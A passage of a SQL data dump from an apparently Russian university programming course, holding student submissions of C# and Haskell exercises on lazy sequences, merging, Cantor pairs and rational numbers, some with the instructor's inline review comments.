second source array are different.");\r\n\r\n            else\r\n\r\n                Console.WriteLine("There are equal elements in the second source array.");\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.ReadLine();\r\n\r\n\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3191, 85, '355679', '2012-11-05 13:27:14', 1, 'data Ration = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n	show (Rat a b) = (if a * b < 0 then "-" else "") ++ show (abs a) ++ "/" ++ show (abs b) \r\n\r\n\r\n\r\ninstance Eq (Ration) where\r\n\r\n	(Rat a1 b1) == (Rat a2 b2) = a1 * b2 == a2 * b1\r\n\r\n\r\n\r\ninstance Num (Ration) where\r\n\r\n	(Rat a1 b1) + (Rat a2 b2) = Rat (a1 * abs b2 + a2 * abs b1) (b1 * b2)\r\n\r\n	(Rat a1 b1) - (Rat a2 b2) = (Rat a1 b1) + (Rat (-a2) b2)\r\n\r\n\r\n\r\ninstance Ord (Ration) where\r\n\r\n	(Rat a1 b1) `compare` (Rat a2 b2) = (a1 * (abs b2) * (signum b1)) `compare` (a2 * (abs b1) * (signum b2))\r\n\r\n\r\n\r\ntestEq = (Rat 3 (-7)) == (Rat (-3) 7)\r\n\r\ntestShow = show (Rat 3 (-2)) == "-3/2"\r\n\r\ntestPlus1 = ((Rat 1 2) + (Rat (-6) 7)) == (Rat (-5) 14)\r\n\r\ntestPlus2 = ((Rat 1 3) - (Rat (-1) 2)) == (Rat 5 6)\r\n\r\ntestOrd = (Rat (-2) (-7)) > (Rat 1 (-10000))\r\n\r\ntestOrd2 = (Rat 1 (-2)) < (Rat 1 2)\r\n\r\ntest = testEq && testShow && testPlus2 && testPlus1 && testOrd && testOrd2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3192, 95, '2562137', '2012-11-05 14:11:03', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace AllDifferent\r\n\r\n{\r\n\r\n    class MainClass\r\n\r\n    {\r\n\r\n		public static bool allDifferent(int[] a)\r\n\r\n		{\r\n\r\n			return allDifferent1(a, 0, t => true);\r\n\r\n		}\r\n\r\n\r\n\r\n		public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n\r\n		{\r\n\r\n			return (from == a.Length) || cond(a[from]) && allDifferent1(a, from+1, t => (cond(t) && t != a[from]));\r\n\r\n		}\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n        	int[] a = {1, 2, 3, 4, 5};\r\n\r\n        	Console.WriteLine(allDifferent(a));\r\n\r\n        	int[] b = {1, 2, 3, 2, 5};\r\n\r\n        	Console.WriteLine(allDifferent(b));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3193, 83, 'erwert', '2012-11-05 14:27:01', 1, '        public static IEnumerable Lst239()\r\n        {\r\n            int j, t, nl;\r\n            yield return 2;\r\n            foreach (int l in Lst239())\r\n            {\r\n                j = 0;\r\n                nl = l;\r\n                while( nl > 0 && nl % 10 == 9) {\r\n                    j = j * 10 + 2;\r\n                    nl /= 10;\r\n                }\r\n                if (nl == 0)\r\n                    nl = 2 * (int) Math.Pow(10, Math.Ceiling(Math.Log10((double)j))) + j;\r\n                else\r\n                {\r\n                    t = (nl % 10 == 2) ? 3 : 9;\r\n                    nl = ((nl / 10) * 10 + t);\r\n                    if (j > 0)\r\n                        nl = nl * (int) Math.Pow(10, Math.Ceiling(Math.Log10((double)j))) + j;\r\n                }\r\n                yield return nl;\r\n            }\r\n        }', '<br/>Тесты успешно пройдены!'),
(3194, 96, 'Deutsche', '2012-11-05 14:40:49', 2, '﻿// Задача 24.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace _24._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        // если передавать обычные массивы (как в примере вызова в условии задания), то аргументы не могут быть типа IEnumerable<int>\r\n   --- А почему вы так думаете?\r\n   ---  Array имеет интерфейс IEnumerable, именно по этому мы можем например писать для массивов foreach\r\n   ---  Это прямо написано в документации: http://msdn.microsoft.com/en-us/library/9b9dty7d(v=vs.80).aspx\r\n   --- Если у вас есть пример, из которого видно не так, выложите его сюда или пришлите по почте,\r\n   --- пожалуйста, разберемся.\r\n        public static IEnumerable<int> Merge(int[] a, int[] b)\r\n\r\n        {\r\n\r\n            int i = 0, j = 0;\r\n\r\n            while ((i < a.Length) || (j < b.Length))\r\n\r\n            {\r\n\r\n                if (j >= b.Length)\r\n\r\n                {\r\n\r\n                    yield return a[i];\r\n\r\n                    i++;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                    if (i >= a.Length)\r\n\r\n                    {\r\n\r\n                        yield return b[j];\r\n\r\n                        j++;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                        if (a[i] < b[j])\r\n\r\n                        {\r\n\r\n                            yield return a[i];\r\n\r\n                            i++;\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                            if (a[i] > b[j])\r\n\r\n                            {\r\n\r\n                                yield return b[j];\r\n\r\n                                j++;\r\n\r\n                            }\r\n\r\n                            else\r\n\r\n                            {\r\n\r\n                                yield return a[i];\r\n\r\n                                i++;\r\n\r\n                                j++;\r\n\r\n                            }\r\n\r\n            }\r\n\r\n            yield break;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8, 15, 25, 35, 687, 48858, 3633757 };\r\n\r\n            int[] b = { 3, 5, 9, 25, 45, 687, 4684, 4777, 48858, 567979, 3654884 };\r\n\r\n            Console.WriteLine("Source array #1:");\r\n\r\n            for (int i = 0; i < a.Length; i++)\r\n\r\n                Console.Write(a[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine("Source array #2:");\r\n\r\n            for (int i = 0; i < b.Length; i++)\r\n\r\n                Console.Write(b[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.WriteLine("Result of merge:");\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.Write(i.ToString() + "    ");\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3195, 79, '374969', '2012-11-05 15:05:55', 0, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace CAFunk\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			write100(digits(7));\r\n		}\r\n\r\n		static void write100(IEnumerable<int> d)\r\n		{\r\n			Console.Write("0,");\r\n			foreach (var i in d.Take(100))\r\n			{\r\n				Console.Write(i);\r\n			}\r\n			Console.WriteLine();\r\n		}\r\n\r\n		static IEnumerable<int> digits(int n)\r\n		{\r\n			var cur = 1;\r\n			while (cur != null)\r\n			{\r\n				cur *= 10;\r\n				var div = cur/n;\r\n				yield return div;\r\n				cur %= n;\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3196, 80, '374969', '2012-11-05 15:10:56', 0, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace CAFunk\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			write100(digits(7));\r\n		}\r\n\r\n		static IEnumerable<Tuple<int, int>> cantor()\r\n		{\r\n			for (var i = 2; ; i++)\r\n			{\r\n				\r\n			}\r\n		}\r\n\r\n		static void write100(IEnumerable<int> d)\r\n		{\r\n			Console.Write("0,");\r\n			foreach (var i in d.Take(100))\r\n			{\r\n				Console.Write(i);\r\n			}\r\n			Console.WriteLine();\r\n		}\r\n\r\n		static IEnumerable<int> digits(int n)\r\n		{\r\n			var cur = 1;\r\n			while (cur != 0)\r\n			{\r\n				cur *= 10;\r\n				var div = cur/n;\r\n				yield return div;\r\n				cur %= n;\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3197, 96, '2562137', '2012-11-05 15:11:35', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections;\r\nusing System.Collections.Generic;\r\n\r\nnamespace AllDifferent\r\n{\r\n    class MainClass\r\n    {\r\n		public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n		{\r\n			IEnumerator<int> i = a.GetEnumerator(), j = b.GetEnumerator();\r\n			bool iHasNext = i.MoveNext(), jHasNext = j.MoveNext();\r\n\r\n			while (iHasNext || jHasNext)\r\n			{\r\n				if (!jHasNext || iHasNext && i.Current < j.Current)\r\n				{\r\n					yield return i.Current;\r\n					iHasNext = i.MoveNext();\r\n				}\r\n				else\r\n				{\r\n					yield return j.Current;\r\n					jHasNext = j.MoveNext();\r\n				}\r\n			}\r\n		}\r\n\r\n        static void Main(string[] args)\r\n        {\r\n        	int[] a = {1, 5, 6, 10};\r\n        	int[] b = {2, 3, 4, 7, 8, 9};\r\n        	foreach (int i in Merge(a, b))\r\n            {\r\n            	Console.WriteLine(i);\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3198, 80, '374969', '2012-11-05 15:15:22', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace CAFunk\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			foreach (var i in cantor().Take(10))\r\n			{\r\n				Console.WriteLine(i);\r\n			}\r\n		}\r\n\r\n		static IEnumerable<Tuple<int, int>> cantor()\r\n		{\r\n			for (var i = 2; ; i++)\r\n			{\r\n				for (var j = 1; j < i; j++)\r\n				{\r\n					yield return Tuple.Create(j, i-j);\r\n				}\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3199, 79, '374969', '2012-11-05 15:16:52', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace CAFunk\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			write100(digits(7));\r\n		}\r\n\r\n		static void write100(IEnumerable d)\r\n		{\r\n			Console.Write("0,");\r\n			foreach (var i in d.Take(100))\r\n			{\r\n				Console.Write(i);\r\n			}\r\n			Console.WriteLine();\r\n		}\r\n\r\n		static IEnumerable digits(int n)\r\n		{\r\n			var cur = 1;\r\n			while (cur != 0)\r\n			{\r\n				cur *= 10;\r\n				var div = cur/n;\r\n				yield return div;\r\n				cur %= n;\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3200, 80, '51559263', '2012-11-05 15:22:16', 0, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace digits\r\n{\r\n    class Program\r\n    {\r\n        public struct Pair\r\n        {\r\n            public Pair (int _a, int _b)\r\n            {\r\n                a = _a;\r\n                b = _b;\r\n            }\r\n\r\n            public int a;\r\n            public int b;\r\n        }\r\n\r\n        public static IEnumerable<Pair> cantor()\r\n        {\r\n            for (int n = 2; ; n++)\r\n            {\r\n                for (int i = 1; i < n; i++)\r\n                {\r\n                    yield return new Pair(i, n - i);\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main()\r\n        {\r\n            int j = 0;\r\n            foreach (Pair p in cantor())\r\n            {\r\n                j++;\r\n                Console.Write("( " + p.a + ", " + p.b + " )" + "  ");\r\n                if (j > 100)\r\n                    break;\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3201, 80, '51559263', '2012-11-05 15:23:28', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace cantor\r\n{\r\n    class Program\r\n    {\r\n        public struct Pair\r\n        {\r\n            public Pair (int _a, int _b)\r\n            {\r\n                a = _a;\r\n                b = _b;\r\n            }\r\n\r\n            public int a;\r\n            public int b;\r\n        }\r\n\r\n        public static IEnumerable<Pair> cantor()\r\n        {\r\n            for (int n = 2; ; n++)\r\n            {\r\n                for (int i = 1; i < n; i++)\r\n                {\r\n                    yield return new Pair(i, n - i);\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main()\r\n        {\r\n            int j = 0;\r\n            foreach (Pair p in cantor())\r\n            {\r\n                j++;\r\n                Console.Write("( " + p.a + ", " + p.b + " )" + "  ");\r\n                if (j > 100)\r\n                    break;\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3202, 79, '329842', '2012-11-05 15:37:45', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Fp\r\n{\r\n	class MainClass\r\n	{\r\n		public static IEnumerable<int> Digits(int n)\r\n		{\r\n			int first = 1;\r\n			while (true)\r\n			{\r\n				first *= 10;\r\n				while (first < n)\r\n				{\r\n					yield return 0;\r\n					first *= 10;\r\n				}\r\n				yield return first / n;\r\n				first %= n;\r\n			}\r\n		}\r\n\r\n		private const int DIGITS_COUNT = 100;\r\n\r\n		public static void Main(string[] args)\r\n		{\r\n			Console.Write("Input n: ");\r\n			int n = int.Parse(Console.ReadLine());\r\n			Console.Write("Digits: ");\r\n			for (int i = 0; i < DIGITS_COUNT; i++)\r\n			{\r\n				Console.Write(Digits(n).ElementAt(i));\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3203, 80, '329842', '2012-11-05 15:42:50', 2, '  --- Нет, это не совсем то, даже странно, что вы прислали такое решение.\r\n  --- Ведь совершенно очевидно, что ваша программа никогда не напечатает\r\n  --- 2 2 :( Так навсегда и останется на первой строке\r\n  --- Исправьте,пожалуйста, скажем до среды включительно.\r\nusing System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Fp192\r\n{\r\n	class MainClass\r\n	{\r\n		private static IEnumerable<Tuple<int,int>> Cantor()\r\n		{\r\n			for (int i = 1; ; i++)\r\n			{\r\n				for (int j = 1; ; j++)\r\n				{\r\n					yield return new Tuple<int, int>(i,j);\r\n				}\r\n			}\r\n		}\r\n\r\n		public static void Main(string[] args)\r\n		{\r\n			for (int i = 0; i < 10; i++)\r\n			{\r\n				Console.WriteLine(Cantor().ElementAt(i));\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3204, 84, '329842', '2012-11-05 15:50:38', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Fp212\r\n{\r\n	class MainClass\r\n	{\r\n		private static IEnumerable<double> Iterate(double x, Func<double, double> iterator)\r\n		{\r\n			while (true)\r\n			{\r\n				yield return x;\r\n				x = iterator(x);\r\n			}\r\n		}\r\n\r\n		public static void Main(string[] args)\r\n		{\r\n			foreach (double x in Iterate(2, x => x*2))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (x > 1000000)\r\n					break;\r\n			}\r\n\r\n			int i = 0;\r\n			foreach (double x in Iterate(1, Math.Sin))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (i++ == 100)\r\n					break;\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3205, 96, '329842', '2012-11-05 16:21:10', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Fp242\r\n{\r\n	class MainClass\r\n	{\r\n		private static IEnumerable<int> Merge(IEnumerable<int> first, IEnumerable<int> second)\r\n		{\r\n			var a = first.GetEnumerator();\r\n			bool aOK = a.MoveNext();\r\n			\r\n			foreach (var b in second)\r\n			{\r\n				while (aOK && a.Current <= b)\r\n				{\r\n					if (a.Current != b)\r\n					{\r\n						yield return a.Current;\r\n					}\r\n					aOK = a.MoveNext();\r\n				}\r\n				yield return b;\r\n			}\r\n\r\n			while (aOK) { yield return a.Current; aOK = a.MoveNext(); }\r\n		}\r\n\r\n		public static void Main(string[] args)\r\n		{\r\n			int [] a = { 1, 5, 8 };\r\n			int [] b = { 3, 5, 9 };\r\n			foreach (int i in Merge(a, b))\r\n			{\r\n				Console.WriteLine(i); // Должно напечататься 1, 3, 5, 8, 9\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3206, 80, '329842', '2012-11-05 16:32:05', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Fp192\r\n{\r\n	class MainClass\r\n	{\r\n		private static IEnumerable<Tuple<int,int>> Cantor()\r\n		{\r\n			for (int i = 1; ; i++)\r\n			{\r\n				for (int j = 1; j <= i; j++)\r\n				{\r\n					yield return new Tuple<int, int>(i, j);\r\n					if (i != j)\r\n					{\r\n						yield return new Tuple<int, int>(j, i);\r\n					}\r\n				}\r\n			}\r\n		}\r\n\r\n		public static void Main(string[] args)\r\n		{\r\n			for (int i = 0; i < 20; i++)\r\n			{\r\n				Console.WriteLine(Cantor().ElementAt(i));\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3207, 84, '533223', '2012-11-05 16:38:41', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintTable\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<double> Iterate(double x, Func<double,double> f)\r\n        {\r\n            yield return x;\r\n            foreach (double i in Iterate( x, f ))\r\n            {\r\n                yield return f(i);\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (x > 1000000)\r\n                    break;\r\n            }\r\n\r\n            int i = 0;\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (i++ == 100)\r\n                    break;\r\n            }\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3208, 96, 'Deutsche', '2012-11-05 17:01:01', 2, '﻿// Задача 24.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace _24._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a1, IEnumerable<int> b1)\r\n\r\n        {\r\n            int l1 = 0, l2 = 0;\r\n\r\n            foreach (int x in a1) { l1++; }\r\n\r\n            foreach (int x in b1) { l2++; }\r\n\r\n            int[] a = new int[l1];\r\n\r\n            int[] b = new int[l2];\r\n\r\n            Array.Copy((Array)a1, a, l1);\r\n\r\n            Array.Copy((Array)b1, b, l2);\r\n    --- Нет, но так не будет работать с бесконечными последовательностями ((\r\n    --- Те внутри уже нельзя использовать массивы.. Смотрите, я дам совет\r\n    --- Надо для a1 и b1 вызвать GetEnumerable();\r\n    --- Получатся некоторые обьекты, у которых есть методы MoveNext и Current\r\n    --- Надо понять, что они делают и возвращают и написать с их помощью Merge\r\n    --- Попробуйте, пожалуйста. Если сегодня не успеете, можно и завтра.\r\n\r\n\r\n            int i = 0, j = 0;\r\n\r\n            while ((i < a.Length) || (j < b.Length))\r\n\r\n            {\r\n\r\n                if (j >= b.Length)\r\n\r\n                {\r\n\r\n                    yield return a[i];\r\n\r\n                    i++;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                    if (i >= a.Length)\r\n\r\n                    {\r\n\r\n                        yield return b[j];\r\n\r\n                        j++;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                        if (a[i] < b[j])\r\n\r\n                        {\r\n\r\n                            yield return a[i];\r\n\r\n                            i++;\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                            if (a[i] > b[j])\r\n\r\n                            {\r\n\r\n                                yield return b[j];\r\n\r\n                                j++;\r\n\r\n                            }\r\n\r\n                            else\r\n\r\n                            {\r\n\r\n                                yield return a[i];\r\n\r\n                                i++;\r\n\r\n                                j++;\r\n\r\n                            }\r\n\r\n            }\r\n\r\n            yield break;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8, 15, 25, 35, 687, 48858, 3633757 };\r\n\r\n            int[] b = { 3, 5, 9, 25, 45, 687, 4684, 4777, 48858, 567979, 3654884 };\r\n\r\n            Console.WriteLine("Source array #1:");\r\n\r\n            for (int i = 0; i < a.Length; i++)\r\n\r\n                Console.Write(a[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine("Source array #2:");\r\n\r\n            for (int i = 0; i < b.Length; i++)\r\n\r\n                Console.Write(b[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.WriteLine("Result of merge:");\r\n\r\n            \r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.Write(i.ToString() + "    ");\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3209, 91, '329842', '2012-11-05 17:14:23', 1, 'merge xs [] = xs\r\nmerge [] ys = ys\r\nmerge (x:xs) (y:ys) = (if x == y then [x] else (if x < y then x:[y] else y:[x])) ++ merge xs ys', '<br/>Тесты успешно пройдены!'),
(3210, 81, '329842', '2012-11-05 18:03:23', 1, 'lst239tn 0 = [[]]\r\nlst239tn n =  [x:y | x <- [2,3,9], y <- lst239tn (n - 1)]\r\n\r\nlst239t = foldr (++) [[]] (map lst239tn [1..])\r\n\r\nlst239 = map (foldl (x y -> x * 10 + y) 0) lst239t\r\n\r\n-- если будет минутка, напишите пожалуйста, как правильно..\r\n   --- На самом деле вы очень близко к самому короткому решению подошли.\r\n   --- Но короче можно так:\r\n   --- lst239 = 2:3:9:[10*x + y | x<-lst239, y <-[2,3,9]]\r\n   --- Вы только другим не говорите, пожалуйста, тут интересно самому подумать) А я потом всем покажу.', '<br/>Тесты успешно пройдены!'),
(3211, 83, '329842', '2012-11-05 18:45:39', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\n//Не загрузить текстом больше 1000 символов\r\n\r\nnamespace Fp211\r\n\r\n{\r\n\r\n	class MainClass\r\n\r\n	{\r\n\r\n		private static IEnumerable<IEnumerable<int>> Lst239tn(int n)\r\n\r\n		{\r\n\r\n			if (n == 0)\r\n\r\n			{\r\n\r\n				var result = new List<List<int>>();\r\n\r\n				result.Add(new List<int>());\r\n\r\n				return result;\r\n\r\n			}\r\n\r\n			var prev = Lst239tn(n - 1);\r\n\r\n			return prev.Select(x => (new [] { 2 }).Concat(x))\r\n\r\n				.Concat(prev.Select(x => (new [] { 3 }).Concat(x)))\r\n\r\n					.Concat(prev.Select(x => (new [] { 9 }).Concat(x)));\r\n\r\n		}\r\n\r\n\r\n\r\n		private static int ToInt(IEnumerable<int> item)\r\n\r\n		{\r\n\r\n			var result = 0;\r\n\r\n			foreach (var dec in item)\r\n\r\n			{\r\n\r\n				result = result * 10 + dec;\r\n\r\n			}\r\n\r\n			return result;\r\n\r\n		}\r\n\r\n\r\n\r\n		private static IEnumerable<int> Lst239t()\r\n\r\n		{\r\n\r\n			for (int i = 1; ; i++)\r\n\r\n			{\r\n\r\n				foreach (var item in Lst239tn(i))\r\n\r\n				{\r\n\r\n					yield return ToInt(item);\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		public static void Main(string[] args)\r\n\r\n		{\r\n\r\n			Console.WriteLine("Hello World!");\r\n\r\n			var a = Lst239t().Take(15);\r\n\r\n			foreach (var item in a)\r\n\r\n			{\r\n\r\n				Console.WriteLine(item);\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3212, 96, 'Deutsche', '2012-11-05 18:59:15', 1, '﻿// Задача 24.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace _24._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a1, IEnumerable<int> b1)\r\n\r\n        {\r\n\r\n            IEnumerator<int> aiter = a1.GetEnumerator();\r\n\r\n            IEnumerator<int> biter = b1.GetEnumerator();\r\n\r\n            bool at = true,  bt = true;\r\n\r\n            bool s = true;\r\n\r\n            while ((!at)||(aiter.MoveNext()))\r\n\r\n            {\r\n\r\n                if (bt)\r\n\r\n                    s = biter.MoveNext();\r\n\r\n                if (!s)\r\n\r\n                {\r\n\r\n                    yield return aiter.Current;\r\n\r\n                }\r\n\r\n                \r\n\r\n                else\r\n\r\n                    if (aiter.Current < biter.Current)\r\n\r\n                    {\r\n\r\n                        yield return aiter.Current;\r\n\r\n                        bt = false;\r\n\r\n                        at = true;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                        if (aiter.Current > biter.Current)\r\n\r\n                        {\r\n\r\n                            yield return biter.Current;\r\n\r\n                            bt = true;\r\n\r\n                            at = false;\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                        {\r\n\r\n                            yield return aiter.Current;\r\n\r\n                            at = true;\r\n\r\n                            bt = true;\r\n\r\n                        }\r\n\r\n            }\r\n\r\n            if (s)\r\n\r\n                yield return biter.Current;\r\n\r\n            while (biter.MoveNext())\r\n\r\n            {\r\n\r\n                yield return biter.Current;\r\n\r\n            }\r\n\r\n            \r\n\r\n            yield break;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8, 15, 25, 35, 687, 48858, 3633757 };\r\n\r\n            int[] b = { 3, 5, 9, 25, 45, 687, 4684, 4777, 48858, 567979, 3654884 };\r\n\r\n            Console.WriteLine("Source array #1:");\r\n\r\n            for (int i = 0; i < a.Length; i++)\r\n\r\n                Console.Write(a[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine("Source array #2:");\r\n\r\n            for (int i = 0; i < b.Length; i++)\r\n\r\n                Console.Write(b[i] + "   ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.WriteLine("Result of merge:");\r\n\r\n\r\n\r\n            if (a.Length < b.Length)\r\n\r\n            {\r\n\r\n                foreach (int i in Merge(a, b))\r\n\r\n                {\r\n\r\n                    Console.Write(i.ToString() + "    ");\r\n\r\n                }\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                foreach (int i in Merge(b, a))\r\n\r\n                {\r\n\r\n                    Console.Write(i.ToString() + "    ");\r\n\r\n                }\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3213, 93, '787463', '2012-11-05 19:44:48', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n    | x == y = x : merge xs ys\r\n    | x > y = y : merge (x:xs) ys\r\n    | otherwise = x : merge xs (y:ys)\r\n\r\nham = 1 : merge (map (*3) ham) (map (*10) ham)', '<br/>Тесты успешно пройдены!'),
(3214, 90, '472848', '2012-11-05 20:16:09', 1, 'findSame [x] = Nothing\r\nfindSame (x:xs) \r\n  | findSame1 x xs = Just x\r\n  | otherwise      = findSame xs\r\n\r\nfindSame1 x [] = False\r\nfindSame1 x (y:ys) = x == y || findSame1 x ys', '<br/>Тесты успешно пройдены!'),
(3215, 94, '2562137', '2012-11-06 00:48:06', 1, 'data Res = R Integer | Serial Res Res | Parallel Res Res\r\n\r\n\r\n\r\nnumlen x = if x == 0 then 0 else 1 + numlen (div x 10)\r\n\r\n\r\n\r\n-- Returns width of the image.\r\n\r\nwidth (R x) = numlen x + 2\r\n\r\nwidth (Serial r1 r2) = width r1 + width r2 + 3\r\n\r\nwidth (Parallel r1 r2) = max (width r1) (width r2) + 2\r\n\r\n\r\n\r\n-- Returns height of the image.\r\n\r\nheight (R x) = 1\r\n\r\nheight (Serial r1 r2) = max (height r1) (height r2)\r\n\r\nheight (Parallel r1 r2) = height r1 + height r2 + 1\r\n\r\n\r\n\r\n-- Returns a list containing n copies of x.\r\n\r\ncopy x 0 = []\r\n\r\ncopy x n = x : copy x (n-1)\r\n\r\n\r\n\r\n-- Returns a string of n copies of t.\r\n\r\ncopystr t n = foldr (++) "" (copy t n)\r\n\r\n\r\n\r\n-- Returns strings of list concatenated via newline.\r\n\r\njoin list = foldr (x y -> x++"\r\n"++y) "" list\r\n\r\n\r\n\r\n-- Returns string padded with t to length w.\r\n\r\naddstr t w line = line ++ (copystr t (w - length line))\r\n\r\naddspace = addstr " "\r\n\r\n\r\n\r\n-- Returns lines with a string s starting from position (h, w) while filling with t.\r\n\r\naddx s t 0 w [] = []\r\n\r\naddx s t 0 w (line:lines) = ((addstr t w line) ++ s) : lines\r\n\r\naddx s t h w (line:lines) = line : addx s t (h-1) w 